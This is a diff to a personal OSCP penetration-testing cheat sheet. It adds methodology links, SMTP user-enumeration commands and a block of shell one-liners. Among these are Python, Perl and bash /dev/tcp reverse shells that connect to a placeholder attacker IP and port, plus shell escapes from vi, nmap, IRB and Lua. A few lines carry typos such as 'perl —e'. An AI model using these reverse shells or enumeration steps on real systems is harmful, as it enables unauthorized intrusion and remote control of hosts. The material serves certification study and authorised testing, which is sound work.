@@ -1,6 +1,11 @@
 # OSCP-shortsheet
 - 🚀 Prepared as part of my OSCP journey.
 
+# METHODOLOGY (MUST READ)
+- https://github.com/adon90/pentest_compilation?tab=readme-ov-file
+- https://gist.github.com/unfo/5ddc85671dcf39f877aaf5dce105fac3
+- https://topi.gitbook.io/t0pitheripper/master/attacks
+
 # Best summary
 https://parzival.sh/blog/my-oscp-notes-and-resources
 
@@ -125,6 +130,13 @@ hydra [-L users.txt or -l user_name] [-P pass.txt or -p password] -f [-S port] f
 ### SSH (22)
 ```bash
 nc $IP 22
+```
+
+### SMTP
+```bash
+nmap -p25 <[SUBNET]> --open
+nc -nv IP 25
+VRFY <[USERNAME]>
 ```
 
 ### Web scan (80, 443, 8080, 8081, 8443, and 3000)
@@ -1486,7 +1498,43 @@ sudo ss -antlp | grep sshd
 - https://docs.gorigorisensei.com/port-forwarding
 
 ## upgrade shell
-- https://fareedfauzi.gitbook.io/oscp-playbook/reverse-shell/interactive-ttys-shell 
+- https://fareedfauzi.gitbook.io/oscp-playbook/reverse-shell/interactive-ttys-shell
+- https://github.com/pythonmaster41/Go-For-OSCP
+
+```bash
+#Python
+python -c 'import pty; pty.spawn("/bin/sh")'
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<[IP]>",<[PORT]>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
+
+#Bash
+echo os.system('/bin/bash')
+/bin/sh -i
+exec 5<>/dev/tcp/<[IP]>/<[PORT]> cat <&5 | while read line; do $line 2>&5 >&5; done
+
+#Perl
+perl —e 'exec "/bin/sh";'
+perl: exec "/bin/sh";
+perl -e 'use Socket;$i="<[IP]>";$p=<[PORT]>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+#Ruby:
+ruby: exec "/bin/sh"
+
+#Lua
+lua: os.execute('/bin/sh')
+
+#From within IRB
+exec "/bin/sh"
+
+#From within vi
+:!bash
+
+#From within vi
+:set shell=/bin/bash:shell
+
+#From within nmap
+!sh
+```
+
 - SHELL=/bin/bash script -q /dev/null    #Upgrade from shell to bash.
 - python3- c 'import pty;pty.spawn("/bin/sh")'        #Python PTY Module
 - stty raw -echo      #Fully Interactive TTY
